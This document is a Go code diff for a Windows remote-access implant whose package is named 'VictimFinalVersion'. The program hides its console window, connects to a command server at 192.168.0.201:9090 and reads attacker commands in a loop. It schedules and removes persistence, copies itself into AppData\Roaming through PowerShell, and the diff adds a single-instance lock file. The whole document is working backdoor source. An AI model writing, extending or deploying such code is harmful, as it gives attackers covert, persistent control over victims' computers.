@@ -16,10 +16,10 @@ import (
 	"VictimFinalVersion/core/wall"
 	"bufio"
 	"fmt"
-	"log"
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"syscall"
 )
@@ -33,17 +33,17 @@ func DisplayError(err error) {
 func main() {
 	HideConsole()
 
+	Setup()
+
 	ServerIP := "192.168.0.201"
 	Port := "9090"
 	connection, err := handleConnection.ConnectWithServer(ServerIP, Port)
 	if err != nil {
-		log.Fatal(err)
+		os.Exit(1)
 	}
 	defer connection.Close()
 	fmt.Println("\033[H\033[2J")
-	fmt.Println("[+] Conneciton established with Server :", connection.RemoteAddr().String())
-
-	Setup()
+	fmt.Println("[+] Connection established with Server :", connection.RemoteAddr().String())
 
 	reader := bufio.NewReader(connection)
 
@@ -53,7 +53,8 @@ func main() {
 
 		user_input_raw, err := reader.ReadString('\n')
 		if err != nil {
-			fmt.Println(err)
+			fmt.Println("[-] Connection died")
+			os.Exit(999)
 			continue
 		}
 
@@ -116,7 +117,7 @@ func main() {
 			err = persist.Schedule(connection)
 			DisplayError(err)
 
-		case user_input == "disarm&exit":
+		case user_input == "diffuse":
 			fmt.Println("[+] removing persistance")
 			err = persist.Remove(connection)
 			DisplayError(err)
@@ -167,13 +168,20 @@ ELSE:
 		panic(c1)
 	}
 	c2 := exec.Command("powershell", "Copy-Item", "\""+os.Args[0]+"\"", "-Destination", "\""+folder_path+"\"", "-Recurse")
+	//fmt.Println("powershell", "Copy-Item", "\""+os.Args[0]+"\","+"\""+dir+"\\plop.lock"+"\"", "-Destination", "\""+folder_path+"\"", "-Recurse")
 	if err := c2.Run(); err != nil {
 		fmt.Println("Error: ", err)
 	}
-	fmt.Println("powershell", "Copy-Item", "\""+os.Args[0]+"\"", "-Destination", "\""+folder_path+"\"", "-Recurse")
 
+	lockFile, err := CreateLockFile("config.lock")
+	if err != nil {
+		fmt.Println("An instance already exists")
+		os.Exit(99)
+
+		defer lockFile.Close()
+
+	}
 }
-
 func HideConsole() {
 	getConsoleWindow := syscall.NewLazyDLL("kernel32.dll").NewProc("GetConsoleWindow")
 	if getConsoleWindow.Find() != nil {
@@ -191,4 +199,33 @@ func HideConsole() {
 	}
 
 	showWindow.Call(hwnd, 0)
+}
+
+func CreateLockFile(filename string) (*os.File, error) {
+	home, _ := os.UserHomeDir()
+	exe_name := filepath.Base(os.Args[0])
+	without_ext := exe_name[:len(exe_name)-len(filepath.Ext(exe_name))]
+	folder_path := filepath.Join(home, "AppData\\Roaming", without_ext)
+
+	if _, err := os.Stat(filepath.Join(folder_path, filename)); err == nil {
+		// If the files exists, we first try to remove it
+		if err = os.Remove(filepath.Join(folder_path, filename)); err != nil {
+			return nil, err
+		}
+	} else if !os.IsNotExist(err) {
+		return nil, err
+	}
+
+	file, err := os.OpenFile(filepath.Join(folder_path, filename), os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0600)
+	if err != nil {
+		return nil, err
+	}
+
+	// Write PID to lock file
+	_, err = file.WriteString(strconv.Itoa(os.Getpid()))
+	if err != nil {
+		return nil, err
+	}
+
+	return file, nil
 }
